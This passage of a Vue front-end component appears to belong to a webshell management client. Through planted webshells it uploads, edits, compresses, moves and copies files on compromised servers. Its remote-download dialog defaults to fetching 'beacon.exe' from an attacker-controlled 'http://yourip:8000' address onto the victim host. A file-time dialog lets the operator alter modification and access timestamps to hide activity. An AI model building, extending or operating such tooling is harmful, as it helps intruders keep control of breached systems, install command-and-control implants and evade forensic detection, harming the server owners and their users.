        useBigUpload: false,
      })

      loadingMessage.close()

      if (response.data.status === 'success') {
        ElMessage.success(`文件上传成功: ${fileName}`)
      } else {
        ElMessage.error(`文件上传失败: ${response.data.message}`)
      }
    }

    // 刷新文件列表
    loadFileList(currentPath.value)
  } catch (error) {
    uploadProgressVisible.value = false
    console.error('文件上传失败:', error)
    ElMessage.error(`文件上传失败: ${error.response?.data?.message || error.message}`)
  }
}

// 处理新建文件或目录
const handleNewItem = async () => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  try {
    // 显示类型选择对话框
    const itemType = await ElMessageBox.confirm('请选择要新建的类型:', '新建项目', {
      confirmButtonText: '新建文件',
      cancelButtonText: '新建目录',
      distinguishCancelAndClose: true,
      type: 'question',
    })
      .then(() => 'file')
      .catch((action) => {
        if (action === 'cancel') {
          return 'dir'
        }
        throw action // 用户点击了关闭按钮
      })

    // 显示名称输入对话框
    const { value: itemName } = await ElMessageBox.prompt(
      `请输入${itemType === 'file' ? '文件' : '目录'}名称:`,
      `新建${itemType === 'file' ? '文件' : '目录'}`,
      {
        confirmButtonText: '创建',
        cancelButtonText: '取消',
        inputValue: '',
        inputPattern: /^.+$/,
        inputErrorMessage: '名称不能为空',
      },
    )

    if (!itemName) return

    // 构造完整路径
    const targetPath = isWindowsSystem()
      ? currentPath.value + (currentPath.value.endsWith('\\') ? '' : '\\') + itemName
      : currentPath.value + (currentPath.value.endsWith('/') ? '' : '/') + itemName

    // 显示创建进度
    const loadingMessage = ElMessage({
      message: `正在创建${itemType === 'file' ? '文件' : '目录'}...`,
      type: 'info',
      duration: 0,
    })

    // 调用后端API
    const response = await shellApi.value.newFileOrDir({
      webshell_id: props.currentWebshell.id,
      name: targetPath,
      type: itemType,
    })

    loadingMessage.close()

    if (response.data.status === 'success') {
      ElMessage.success(`${itemType === 'file' ? '文件' : '目录'}创建成功: ${itemName}`)
      // 刷新文件列表
      loadFileList(currentPath.value)
    } else {
      ElMessage.error(`${itemType === 'file' ? '文件' : '目录'}创建失败: ${response.data.message}`)
    }
  } catch (error) {
    if (error === 'cancel') {
      // 用户取消操作
      console.log('用户取消新建操作')
    } else {
      console.error('新建失败:', error)
      ElMessage.error(`新建失败: ${error.response?.data?.message || error.message}`)
    }
  }
}

// 处理压缩文件
const handleZipFiles = async () => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  try {
    let compressPaths = []
    let defaultCompressFile = ''

    if (selectedFiles.value.length > 0) {
      // 有选中文件时，使用选中的文件
      compressPaths = selectedFiles.value.map((file) => {
        const separator = isWindowsSystem() ? '\\' : '/'
        return (
          currentPath.value + (currentPath.value.endsWith(separator) ? '' : separator) + file.name
        )
      })

      // 默认压缩文件路径为当前路径/result.zip
      const separator = isWindowsSystem() ? '\\' : '/'
      defaultCompressFile =
        currentPath.value + (currentPath.value.endsWith(separator) ? '' : separator) + 'result.zip'

      // 只显示压缩文件路径输入框
      const { value: compressFile } = await ElMessageBox.prompt(
        `将压缩选中的 ${selectedFiles.value.length} 个文件/目录\n请输入压缩后的文件路径:`,
        '压缩文件',
        {
          confirmButtonText: '开始压缩',
          cancelButtonText: '取消',
          inputValue: defaultCompressFile,
          inputPattern: /^.+\.(zip|rar|7z|tar|tar\.gz)$/i,
          inputErrorMessage: '请输入有效的压缩文件路径（支持 .zip, .rar, .7z, .tar, .tar.gz）',
        },
      )

      if (!compressFile) return

      await performZipOperation(compressPaths, compressFile)
    } else {
      // 没有选中文件时，显示两个输入框
      const defaultPaths = currentPath.value
      const separator = isWindowsSystem() ? '\\' : '/'
      defaultCompressFile =
        currentPath.value + (currentPath.value.endsWith(separator) ? '' : separator) + 'result.zip'

      // 自定义对话框内容
      const htmlContent = `
        <div style="margin-bottom: 15px;">
          <label style="display: block; margin-bottom: 5px; font-weight: bold;">要压缩的文件/目录路径（多个路径用逗号分隔）:</label>
          <input id="compress-paths-input" type="text" value="${defaultPaths}"
                 style="width: 100%; padding: 8px; border: 1px solid #dcdfe6; border-radius: 4px;"
                 placeholder="例如: /home/user/file1.txt,/home/user/dir1"/>
        </div>
        <div>
          <label style="display: block; margin-bottom: 5px; font-weight: bold;">压缩后的文件路径:</label>
          <input id="compress-file-input" type="text" value="${defaultCompressFile}"
                 style="width: 100%; padding: 8px; border: 1px solid #dcdfe6; border-radius: 4px;"
                 placeholder="例如: /home/user/result.zip"/>
        </div>
      `

      await ElMessageBox.confirm(htmlContent, '压缩文件', {
        confirmButtonText: '开始压缩',
        cancelButtonText: '取消',
        dangerouslyUseHTMLString: true,
        beforeClose: async (action, instance, done) => {
          if (action === 'confirm') {
            const pathsInput = document.getElementById('compress-paths-input')
            const fileInput = document.getElementById('compress-file-input')

            const inputPaths = pathsInput?.value?.trim()
            const inputFile = fileInput?.value?.trim()

            if (!inputPaths) {
              ElMessage.error('请输入要压缩的路径')
              return
            }

            if (!inputFile) {
              ElMessage.error('请输入压缩文件路径')
              return
            }

            if (!/^.+\.(zip|rar|7z|tar|tar\.gz)$/i.test(inputFile)) {
              ElMessage.error('请输入有效的压缩文件路径（支持 .zip, .rar, .7z, .tar, .tar.gz）')
              return
            }

            // 解析路径（用逗号分隔）
            const pathList = inputPaths
              .split(',')
              .map((path) => path.trim())
              .filter((path) => path)

            try {
              await performZipOperation(pathList, inputFile)
              done()
            } catch (error) {
              // 压缩失败，不关闭对话框
              console.error('压缩操作失败:', error)
            }
          } else {
            done()
          }
        },
      })
    }
  } catch (error) {
    if (error === 'cancel') {
      console.log('用户取消压缩操作')
    } else {
      console.error('压缩失败:', error)
      ElMessage.error(`压缩失败: ${error.response?.data?.message || error.message}`)
    }
  }
}

// 执行压缩操作
const performZipOperation = async (compressPaths, compressFile) => {
  // 显示压缩进度
  const loadingMessage = ElMessage({
    message: '正在压缩文件...',
    type: 'info',
    duration: 0,
  })

  try {
    console.log('[DEBUG] 压缩参数:', {
      compressPaths,
      compressFile,
      webshell: props.currentWebshell,
    })

    // 调用后端API
    const response = await shellApi.value.zipFiles({
      webshell_id: props.currentWebshell.id,
      compressPaths: compressPaths,
      compressFile: compressFile,
    })

    loadingMessage.close()

    if (response.data.status === 'success') {
      ElMessage.success(`文件压缩成功: ${compressFile}`)
      console.log('[DEBUG] 压缩成功，使用的类名:', response.data.data.className)

      // 刷新文件列表
      loadFileList(currentPath.value)

      // 清空选中的文件
      selectedFiles.value = []
    } else {
      ElMessage.error(`文件压缩失败: ${response.data.message}`)
    }
  } catch (error) {
    loadingMessage.close()
    console.error('压缩文件API调用失败:', error)
    ElMessage.error(`压缩失败: ${error.response?.data?.message || error.message}`)
    throw error
  }
}

// 处理解压文件
const handleUnzipFiles = async () => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  try {
    let compressFile = ''
    let defaultExtractDir = ''

    // 检查是否选中了压缩文件
    const selectedCompressFiles = selectedFiles.value.filter(
      (file) => /\.(zip|rar|7z|tar|tar\.gz|gz)$/i.test(file.name) && !file.isDirectory,
    )

    if (selectedCompressFiles.length > 0) {
      // 选中了压缩文件时，使用第一个选中的压缩文件
      if (selectedCompressFiles.length > 1) {
        ElMessage.warning('一次只能解压一个压缩文件，将使用第一个选中的文件')
      }

      const selectedFile = selectedCompressFiles[0]
      const separator = isWindowsSystem() ? '\\' : '/'
      compressFile =
        currentPath.value +
        (currentPath.value.endsWith(separator) ? '' : separator) +
        selectedFile.name

      // 默认解压目录为当前路径/文件名(去掉扩展名)
      const fileNameWithoutExt = selectedFile.name.replace(/\.(zip|rar|7z|tar\.gz|tar|gz)$/i, '')
      defaultExtractDir =
        currentPath.value +
        (currentPath.value.endsWith(separator) ? '' : separator) +
        fileNameWithoutExt

      // 只显示解压目录输入框
      const { value: extractDir } = await ElMessageBox.prompt(
        `将解压文件: ${selectedFile.name}\n请输入解压目录路径:`,
        '解压文件',
        {
          confirmButtonText: '开始解压',
          cancelButtonText: '取消',
          inputValue: defaultExtractDir,
          inputPattern: /^.+$/,
          inputErrorMessage: '请输入有效的解压目录路径',
        },
      )

      if (!extractDir) return

      await performUnzipOperation(compressFile, extractDir)
    } else {
      // 没有选中压缩文件时，显示两个输入框
      const separator = isWindowsSystem() ? '\\' : '/'
      const defaultCompressFile =
        currentPath.value + (currentPath.value.endsWith(separator) ? '' : separator) + 'archive.zip'
      defaultExtractDir =
        currentPath.value + (currentPath.value.endsWith(separator) ? '' : separator) + 'extracted'

      // 自定义对话框内容
      const htmlContent = `
        <div style="margin-bottom: 15px;">
          <label style="display: block; margin-bottom: 5px; font-weight: bold;">压缩文件路径:</label>
          <input id="compress-file-input" type="text" value="${defaultCompressFile}"
                 style="width: 100%; padding: 8px; border: 1px solid #dcdfe6; border-radius: 4px;"
                 placeholder="例如: /home/user/archive.zip"/>
        </div>
        <div>
          <label style="display: block; margin-bottom: 5px; font-weight: bold;">解压目录路径:</label>
          <input id="extract-dir-input" type="text" value="${defaultExtractDir}"
                 style="width: 100%; padding: 8px; border: 1px solid #dcdfe6; border-radius: 4px;"
                 placeholder="例如: /home/user/extracted"/>
        </div>
      `

      await ElMessageBox.confirm(htmlContent, '解压文件', {
        confirmButtonText: '开始解压',
        cancelButtonText: '取消',
        dangerouslyUseHTMLString: true,
        beforeClose: async (action, instance, done) => {
          if (action === 'confirm') {
            const fileInput = document.getElementById('compress-file-input')
            const dirInput = document.getElementById('extract-dir-input')

            const inputFile = fileInput?.value?.trim()
            const inputDir = dirInput?.value?.trim()

            if (!inputFile) {
              ElMessage.error('请输入压缩文件路径')
              return
            }

            if (!inputDir) {
              ElMessage.error('请输入解压目录路径')
              return
            }

            if (!/\.(zip|rar|7z|tar|tar\.gz|gz)$/i.test(inputFile)) {
              ElMessage.error(
                '请输入有效的压缩文件路径（支持 .zip, .rar, .7z, .tar, .tar.gz, .gz）',
              )
              return
            }

            try {
              await performUnzipOperation(inputFile, inputDir)
              done()
            } catch (error) {
              // 解压失败，不关闭对话框
              console.error('解压操作失败:', error)
            }
          } else {
            done()
          }
        },
      })
    }
  } catch (error) {
    if (error === 'cancel') {
      console.log('用户取消解压操作')
    } else {
      console.error('解压失败:', error)
      ElMessage.error(`解压失败: ${error.response?.data?.message || error.message}`)
    }
  }
}

// 执行解压操作
const performUnzipOperation = async (compressFile, extractDir) => {
  // 显示解压进度
  const loadingMessage = ElMessage({
    message: '正在解压文件...',
    type: 'info',
    duration: 0,
  })

  try {
    console.log('[DEBUG] 解压参数:', {
      compressFile,
      extractDir,
      webshell: props.currentWebshell,
    })

    // 调用后端API
    const response = await shellApi.value.unzipFiles({
      webshell_id: props.currentWebshell.id,
      compressFile: compressFile,
      extractDir: extractDir,
    })

    loadingMessage.close()

    if (response.data.status === 'success') {
      ElMessage.success(`文件解压成功: ${extractDir}`)
      console.log('[DEBUG] 解压成功，使用的类名:', response.data.data.className)

      // 刷新文件列表
      loadFileList(currentPath.value)

      // 清空选中的文件
      selectedFiles.value = []
    } else {
      ElMessage.error(`文件解压失败: ${response.data.message}`)
    }
  } catch (error) {
    loadingMessage.close()
    console.error('解压文件API调用失败:', error)
    ElMessage.error(`解压失败: ${error.response?.data?.message || error.message}`)
    throw error
  }
}

// 处理远程下载文件
const handleFileRemoteDownload = async () => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  try {
    // 自定义对话框内容
    const separator = isWindowsSystem() ? '\\' : '/'
    const defaultSavePath =
      currentPath.value + (currentPath.value.endsWith(separator) ? '' : separator) + 'beacon.exe'

    const htmlContent = `
      <div style="margin-bottom: 15px;">
        <label style="display: block; margin-bottom: 5px; font-weight: bold;">远程下载URL:</label>
        <input id="download-url-input" type="text" value="http://yourip:8000/beacon.exe"
               style="width: 100%; padding: 8px; border: 1px solid #dcdfe6; border-radius: 4px;"
               placeholder="例如: http://192.168.1.100:8000/beacon.exe"/>
      </div>
      <div>
        <label style="display: block; margin-bottom: 5px; font-weight: bold;">保存路径:</label>
        <input id="save-path-input" type="text" value="${defaultSavePath}"
               style="width: 100%; padding: 8px; border: 1px solid #dcdfe6; border-radius: 4px;"
               placeholder="例如: /tmp/beacon.exe"/>
        <div style="font-size: 12px; color: #909399; margin-top: 3px;">
          提示：如果输入的是目录路径，系统会自动添加远程文件名
        </div>
      </div>
    `

    await ElMessageBox.confirm(htmlContent, '远程下载文件', {
      confirmButtonText: '开始下载',
      cancelButtonText: '取消',
      dangerouslyUseHTMLString: true,
      beforeClose: async (action, instance, done) => {
        if (action === 'confirm') {
          const urlInput = document.getElementById('download-url-input')
          const pathInput = document.getElementById('save-path-input')

          const downloadUrl = urlInput?.value?.trim()
          let savePath = pathInput?.value?.trim()

          if (!downloadUrl) {
            ElMessage.error('请输入远程下载URL')
            return
          }

          if (!savePath) {
            ElMessage.error('请输入保存路径')
            return
          }

          // 验证URL格式
          try {
            new URL(downloadUrl)
          } catch {
            ElMessage.error('请输入有效的URL地址')
            return
          }

          // 处理保存路径：如果是目录，则添加远程文件名
          try {
            const url = new URL(downloadUrl)
            const pathname = url.pathname
            const remoteFileName = pathname.substring(pathname.lastIndexOf('/') + 1) || 'download'

            // 检查savePath是否是目录（以分隔符结尾或不包含文件扩展名）
            const separator = isWindowsSystem() ? '\\' : '/'

            // 如果路径以分隔符结尾，或者没有扩展名，则认为是目录
            if (savePath.endsWith('/') || savePath.endsWith('\\') || !savePath.includes('.')) {
              // 确保目录路径以正确的分隔符结尾
              if (!savePath.endsWith(separator)) {
                savePath = savePath + separator
              }
              // 添加远程文件名
              savePath = savePath + remoteFileName
            }

            console.log('[DEBUG] 处理后的保存路径:', savePath)

            await performFileRemoteDownload(downloadUrl, savePath)
            done()
          } catch (error) {
            // 下载失败，不关闭对话框
            console.error('远程下载操作失败:', error)
          }
        } else {
          done()
        }
      },
    })
  } catch (error) {
    if (error === 'cancel') {
      console.log('用户取消远程下载操作')
    } else {
      console.error('远程下载失败:', error)
      ElMessage.error(`远程下载失败: ${error.response?.data?.message || error.message}`)
    }
  }
}

// 执行远程下载操作
const performFileRemoteDownload = async (downloadUrl, savePath) => {
  // 显示下载进度
  const loadingMessage = ElMessage({
    message: '正在从远程URL下载文件...',
    type: 'info',
    duration: 0,
  })

  try {
    console.log('[DEBUG] 远程下载参数:', {
      downloadUrl,
      savePath,
      webshell: props.currentWebshell,
    })

    // 调用后端API
    const response = await shellApi.value.fileRemoteDownload({
      webshell_id: props.currentWebshell.id,
      downloadUrl: downloadUrl,
      savePath: savePath,
    })

    loadingMessage.close()

    if (response.data.status === 'success') {
      ElMessage.success(`远程文件下载成功: ${savePath}`)
      console.log('[DEBUG] 远程下载成功')

      // 刷新文件列表
      loadFileList(currentPath.value)

      // 清空选中的文件
      selectedFiles.value = []
    } else {
      ElMessage.error(`远程文件下载失败: ${response.data.message}`)
    }
  } catch (error) {
    loadingMessage.close()
    console.error('远程下载API调用失败:', error)
    ElMessage.error(`远程下载失败: ${error.response?.data?.message || error.message}`)
    throw error
  }
}

// 处理设置文件时间属性
const handleSetFileTime = async () => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  try {
    // 获取默认文件路径
    const separator = isWindowsSystem() ? '\\' : '/'
    let defaultFilePath = currentPath.value

    // 如果有选中文件，使用第一个选中的文件路径
    if (selectedFiles.value.length > 0) {
      const selectedFile = selectedFiles.value[0]
      defaultFilePath =
        currentPath.value +
        (currentPath.value.endsWith(separator) ? '' : separator) +
        selectedFile.name
    }

    // 获取当前时间作为默认值
    const now = new Date()
    const defaultTime =
      now.getFullYear() +
      '-' +
      String(now.getMonth() + 1).padStart(2, '0') +
      '-' +
      String(now.getDate()).padStart(2, '0') +
      ' ' +
      String(now.getHours()).padStart(2, '0') +
      ':' +
      String(now.getMinutes()).padStart(2, '0') +
      ':' +
      String(now.getSeconds()).padStart(2, '0')

    // 自定义对话框内容
    const htmlContent = `
      <div style="margin-bottom: 15px;">
        <label style="display: block; margin-bottom: 5px; font-weight: bold;">文件路径:</label>
        <input id="file-path-input" type="text" value="${defaultFilePath}"
               style="width: 100%; padding: 8px; border: 1px solid #dcdfe6; border-radius: 4px;"
               placeholder="例如: /home/user/file.txt"/>
      </div>
      <div style="margin-bottom: 15px;">
        <label style="display: block; margin-bottom: 5px; font-weight: bold;">修改时间 (YYYY-MM-DD HH:MM:SS):</label>
        <input id="modify-time-input" type="text" value="${defaultTime}"
               style="width: 100%; padding: 8px; border: 1px solid #dcdfe6; border-radius: 4px;"
               placeholder="例如: 2024-01-01 12:00:00 (留空表示不修改)"/>
      </div>
      <div>
        <label style="display: block; margin-bottom: 5px; font-weight: bold;">访问时间 (YYYY-MM-DD HH:MM:SS):</label>
        <input id="access-time-input" type="text" value="${defaultTime}"
               style="width: 100%; padding: 8px; border: 1px solid #dcdfe6; border-radius: 4px;"
               placeholder="例如: 2024-01-01 12:00:00 (留空表示不修改)"/>
        <div style="font-size: 12px; color: #909399; margin-top: 3px;">
          提示：可以单独修改一个时间属性，不需要的可以留空
        </div>
      </div>
    `

    await ElMessageBox.confirm(htmlContent, '修改文件时间属性', {
      confirmButtonText: '确认修改',
      cancelButtonText: '取消',
      dangerouslyUseHTMLString: true,
      beforeClose: async (action, instance, done) => {
        if (action === 'confirm') {
          const pathInput = document.getElementById('file-path-input')
          const modifyTimeInput = document.getElementById('modify-time-input')
          const accessTimeInput = document.getElementById('access-time-input')

          const filePath = pathInput?.value?.trim()
          const modifyTime = modifyTimeInput?.value?.trim()
          const accessTime = accessTimeInput?.value?.trim()

          if (!filePath) {
            ElMessage.error('请输入文件路径')
            return
          }

          if (!modifyTime && !accessTime) {
            ElMessage.error('至少需要设置一个时间属性')
            return
          }

          // 验证时间格式
          const timeRegex = /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/
          if (modifyTime && !timeRegex.test(modifyTime)) {
            ElMessage.error('修改时间格式无效，请使用：YYYY-MM-DD HH:MM:SS')
            return
          }
          if (accessTime && !timeRegex.test(accessTime)) {
            ElMessage.error('访问时间格式无效，请使用：YYYY-MM-DD HH:MM:SS')
            return
          }

          try {
            await performSetFileAttr(filePath, 'time', {
              modifyTime: modifyTime || null,
              accessTime: accessTime || null,
            })
            done()
          } catch (error) {
            // 设置失败，不关闭对话框
            console.error('设置文件时间失败:', error)
          }
        } else {
          done()
        }
      },
    })
  } catch (error) {
    if (error === 'cancel') {
      console.log('用户取消设置文件时间操作')
    } else {
      console.error('设置文件时间失败:', error)
      ElMessage.error(`设置文件时间失败: ${error.response?.data?.message || error.message}`)
    }
  }
}

// 处理设置文件权限属性
const handleSetFilePermission = async () => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  try {
    // 获取默认文件路径
    const separator = isWindowsSystem() ? '\\' : '/'
    let defaultFilePath = currentPath.value

    // 如果有选中文件，使用第一个选中的文件路径
    if (selectedFiles.value.length > 0) {
      const selectedFile = selectedFiles.value[0]
      defaultFilePath =
        currentPath.value +
        (currentPath.value.endsWith(separator) ? '' : separator) +
        selectedFile.name
    }

    // 自定义对话框内容
    const htmlContent = `
      <div style="margin-bottom: 15px;">
        <label style="display: block; margin-bottom: 5px; font-weight: bold;">文件路径:</label>
        <input id="file-path-input" type="text" value="${defaultFilePath}"
               style="width: 100%; padding: 8px; border: 1px solid #dcdfe6; border-radius: 4px;"
               placeholder="例如: /home/user/file.txt"/>
      </div>
      <div>
        <label style="display: block; margin-bottom: 5px; font-weight: bold;">权限属性:</label>
        <input id="permission-input" type="text" value="RWX"
               style="width: 100%; padding: 8px; border: 1px solid #dcdfe6; border-radius: 4px;"
               placeholder="例如: RWX, RW, R, W, X"/>
        <div style="font-size: 12px; color: #909399; margin-top: 3px;">
          提示：只允许输入R、W、X字母的组合，如：RWX（读写执行）、RW（读写）、X（执行）等
        </div>
        <div style="font-size: 12px; color: #606266; margin-top: 8px;">
          <strong>权限说明：</strong><br/>
          R - 读取权限（Read）<br/>
          W - 写入权限（Write）<br/>
          X - 执行权限（eXecute）
        </div>
      </div>
    `

    await ElMessageBox.confirm(htmlContent, '修改文件权限属性', {
      confirmButtonText: '确认修改',
      cancelButtonText: '取消',
      dangerouslyUseHTMLString: true,
      beforeClose: async (action, instance, done) => {
        if (action === 'confirm') {
          const pathInput = document.getElementById('file-path-input')
          const permissionInput = document.getElementById('permission-input')

          const filePath = pathInput?.value?.trim()
          const permission = permissionInput?.value?.trim()

          if (!filePath) {
            ElMessage.error('请输入文件路径')
            return
          }

          if (!permission) {
            ElMessage.error('请输入权限属性')
            return
          }

          // 验证权限格式（只允许R、W、X的组合）
          if (!/^[RWXrwx]+$/.test(permission)) {
            ElMessage.error('权限格式无效，只允许输入R、W、X字母的组合')
            return
          }

          try {
            await performSetFileAttr(filePath, 'permission', {
              permission: permission.toUpperCase(),
            })
            done()
          } catch (error) {
            // 设置失败，不关闭对话框
            console.error('设置文件权限失败:', error)
          }
        } else {
          done()
        }
      },
    })
  } catch (error) {
    if (error === 'cancel') {
      console.log('用户取消设置文件权限操作')
    } else {
      console.error('设置文件权限失败:', error)
      ElMessage.error(`设置文件权限失败: ${error.response?.data?.message || error.message}`)
    }
  }
}

// 执行设置文件属性操作
const performSetFileAttr = async (filePath, attrType, attributes) => {
  // 显示设置进度
  const actionName = attrType === 'time' ? '文件时间' : '文件权限'
  const loadingMessage = ElMessage({
    message: `正在设置${actionName}...`,
    type: 'info',
    duration: 0,
  })

  try {
    console.log('[DEBUG] 设置文件属性参数:', {
      filePath,
      attrType,
      attributes,
      webshell: props.currentWebshell,
    })

    // 构造请求参数
    const requestData = {
      webshell_id: props.currentWebshell.id,
      filePath: filePath,
      attrType: attrType,
      ...attributes,
    }

    // 调用后端API
    const response = await shellApi.value.setFileAttr(requestData)

    loadingMessage.close()

    if (response.data.status === 'success') {
      ElMessage.success(`${actionName}设置成功`)
      console.log('[DEBUG] 文件属性设置成功:', response.data.data)

      // 刷新文件列表
      loadFileList(currentPath.value)

      // 清空选中的文件
      selectedFiles.value = []
    } else {
      ElMessage.error(`${actionName}设置失败: ${response.data.message}`)
    }
  } catch (error) {
    loadingMessage.close()
    console.error('设置文件属性API调用失败:', error)
    ElMessage.error(`${actionName}设置失败: ${error.response?.data?.message || error.message}`)
    throw error
  }
}

// 处理编辑文件内容
const handleEditFileContent = async () => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  // 检查是否只选择了一个文件
  if (selectedFiles.value.length === 0) {
    ElMessage.error('请先选择要编辑的文件')
    return
  }

  if (selectedFiles.value.length > 1) {
    ElMessage.error('只能同时编辑一个文件')
    return
  }

  const selectedFile = selectedFiles.value[0]

  // 检查是否为目录
  if (selectedFile.isDirectory) {
    ElMessage.error('不能编辑目录，请选择文件')
    return
  }

  // 检查文件大小（不能超过1MB）
  const maxSize = 1 * 1024 * 1024 // 1MB
  if (selectedFile.size > maxSize) {
    ElMessage.error(`文件大小超过1MB限制，当前文件大小：${formatFileSize(selectedFile.size)}`)
    return
  }

  try {
    // 构造文件路径
    const separator = isWindowsSystem() ? '\\' : '/'
    const filePath =
      currentPath.value +
      (currentPath.value.endsWith(separator) ? '' : separator) +
      selectedFile.name

    console.log('[DEBUG] 开始编辑文件:', filePath)

    // 显示加载消息
    const loadingMessage = ElMessage({
      message: '正在读取文件内容...',
      type: 'info',
      duration: 0,
    })

    try {
      // 调用下载接口获取文件内容（普通下载）
      const response = await shellApi.value.downloadFile({
        webshell_id: props.currentWebshell.id,
        fileName: filePath,
        useBigDownload: false, // 使用普通下载
      })

      loadingMessage.close()

      if (response.data.status === 'success') {
        const fileData = response.data.data
        let fileContent = ''

        // 根据内容类型处理文件内容
        if (fileData.contentType === 'text') {
          fileContent = fileData.content
        } else if (fileData.contentType === 'binary') {
          // 如果是二进制文件，尝试解码为文本
          try {
            const binaryData = atob(fileData.content) // Base64解码
            fileContent = binaryData
          } catch {
            ElMessage.error('该文件为二进制文件，无法编辑')
            return
          }
        }

        console.log('[DEBUG] 文件内容读取成功，长度:', fileContent.length)

        // 打开文件编辑对话框
        await openFileEditDialog(selectedFile.name, filePath, fileContent)
      } else {
        ElMessage.error(`读取文件失败: ${response.data.message}`)
      }
    } catch (error) {
      loadingMessage.close()
      console.error('下载文件失败:', error)
      ElMessage.error(`读取文件失败: ${error.response?.data?.message || error.message}`)
    }
  } catch (error) {
    console.error('编辑文件失败:', error)
    ElMessage.error(`编辑文件失败: ${error.message}`)
  }
}

// 打开文件编辑对话框
const openFileEditDialog = (fileName, filePath, initialContent) => {
  fileEditorFileName.value = fileName
  fileEditorPath.value = filePath
  fileEditorContent.value = initialContent
  fileEditorInitialContent.value = initialContent
  fileEditorVisible.value = true
}

// 处理编辑器关闭
const handleEditorClose = (done) => {
  if (fileEditorContent.value !== fileEditorInitialContent.value) {
    ElMessageBox.confirm('文件内容已修改但未保存，确定要关闭吗？', '提示', {
      confirmButtonText: '确定关闭',
      cancelButtonText: '取消',
      type: 'warning',
    })
      .then(() => {
        fileEditorVisible.value = false
        if (typeof done === 'function') done()
      })
      .catch(() => {})
  } else {
    fileEditorVisible.value = false
    if (typeof done === 'function') done()
  }
}

// 保存文件内容
const saveFileContent = async () => {
  const newContent = fileEditorContent.value
  const filePath = fileEditorPath.value

  // 检查内容是否有变化
  if (newContent === fileEditorInitialContent.value) {
    ElMessage.info('文件内容未发生变化')
    return
  }

  fileEditorSaving.value = true

  try {
    // 显示保存进度
    const savingMessage = ElMessage({
      message: '正在保存文件...',
      type: 'info',
      duration: 0,
    })

    // 将内容转换为字节数组
    const encoder = new TextEncoder()
    const fileData = Array.from(encoder.encode(newContent))

    console.log('[DEBUG] 保存文件:', filePath, '内容长度:', newContent.length)

    // 调用上传接口保存文件（普通上传）
    const uploadResponse = await shellApi.value.uploadFile({
      webshell_id: props.currentWebshell.id,
      filePath: filePath,
      fileData: fileData,
      useBigUpload: false, // 使用普通上传
    })

    savingMessage.close()

    if (uploadResponse.data.status === 'success') {
      ElMessage.success('文件保存成功')
      console.log('[DEBUG] 文件保存成功')

      // 更新初始内容，避免重复保存提示
      fileEditorInitialContent.value = newContent

      // 刷新文件列表
      loadFileList(currentPath.value)

      // 关闭对话框
      fileEditorVisible.value = false
    } else {
      ElMessage.error(`文件保存失败: ${uploadResponse.data.message}`)
    }
  } catch (error) {
    ElMessage.error(`文件保存失败: ${error.response?.data?.message || error.message}`)
    console.error('保存文件失败:', error)
  } finally {
    fileEditorSaving.value = false
  }
}

// 读取文件为ArrayBuffer
const readFileAsArrayBuffer = (file) => {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload = (e) => resolve(e.target.result)
    reader.onerror = (e) => reject(e)
    reader.readAsArrayBuffer(file)
  })
}

// 处理移动文件
const handleMoveFiles = async () => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  if (selectedFiles.value.length === 0) {
    ElMessage.warning('请先选择要移动的文件')
    return
  }

  if (selectedFiles.value.length > 1) {
    ElMessage.warning('暂时只支持移动单个文件')
    return
  }

  const selectedFile = selectedFiles.value[0]
  const sourcePath = isWindowsSystem()
    ? currentPath.value + (currentPath.value.endsWith('\\') ? '' : '\\') + selectedFile.name
    : currentPath.value + (currentPath.value.endsWith('/') ? '' : '/') + selectedFile.name

  try {
    // 显示移动对话框
    const { value: destPath } = await ElMessageBox.prompt(
      `移动文件: ${selectedFile.name}`,
      '移动文件',
      {
        confirmButtonText: '移动',
        cancelButtonText: '取消',
        inputValue: sourcePath,
        inputPattern: /^.+$/,
        inputErrorMessage: '目标路径不能为空',
      },
    )

    if (!destPath || destPath === sourcePath) {
      ElMessage.warning('目标路径不能为空或与源路径相同')
      return
    }

    // 显示移动进度
    const loadingMessage = ElMessage({
      message: '正在移动文件...',
      type: 'info',
      duration: 0,
    })

    // 调用后端API
    const response = await shellApi.value.moveFile({
      webshell_id: props.currentWebshell.id,
      srcFileName: sourcePath,
      destFileName: destPath,
    })

    loadingMessage.close()

    if (response.data.status === 'success') {
      ElMessage.success(`文件移动成功: ${selectedFile.name}`)
      selectedFiles.value = []
      loadFileList(currentPath.value)
    } else {
      ElMessage.error(`文件移动失败: ${response.data.message}`)
    }
  } catch (error) {
    if (error === 'cancel') {
      console.log('用户取消移动操作')
    } else {
      console.error('移动文件失败:', error)
      ElMessage.error(`移动文件失败: ${error.response?.data?.message || error.message}`)
    }
  }
}

// 处理复制文件
const handleCopyFiles = async () => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  if (selectedFiles.value.length === 0) {
    ElMessage.warning('请先选择要复制的文件')
    return
  }

  if (selectedFiles.value.length > 1) {
    ElMessage.warning('暂时只支持复制单个文件')
    return
  }

  const selectedFile = selectedFiles.value[0]
  const sourcePath = isWindowsSystem()
    ? currentPath.value + (currentPath.value.endsWith('\\') ? '' : '\\') + selectedFile.name
    : currentPath.value + (currentPath.value.endsWith('/') ? '' : '/') + selectedFile.name

  // 生成默认的目标路径（添加_copy后缀）
  let defaultDestPath
  if (selectedFile.name.includes('.')) {
    // 有扩展名的文件：在扩展名前添加_copy
    const lastDotIndex = selectedFile.name.lastIndexOf('.')
    const nameWithoutExt = selectedFile.name.substring(0, lastDotIndex)
    const extension = selectedFile.name.substring(lastDotIndex)
    const newFileName = nameWithoutExt + '_copy' + extension

    defaultDestPath = isWindowsSystem()
      ? currentPath.value + (currentPath.value.endsWith('\\') ? '' : '\\') + newFileName
      : currentPath.value + (currentPath.value.endsWith('/') ? '' : '/') + newFileName
  } else {
    // 没有扩展名的文件：直接在末尾添加_copy
    const newFileName = selectedFile.name + '_copy'
    defaultDestPath = isWindowsSystem()
      ? currentPath.value + (currentPath.value.endsWith('\\') ? '' : '\\') + newFileName
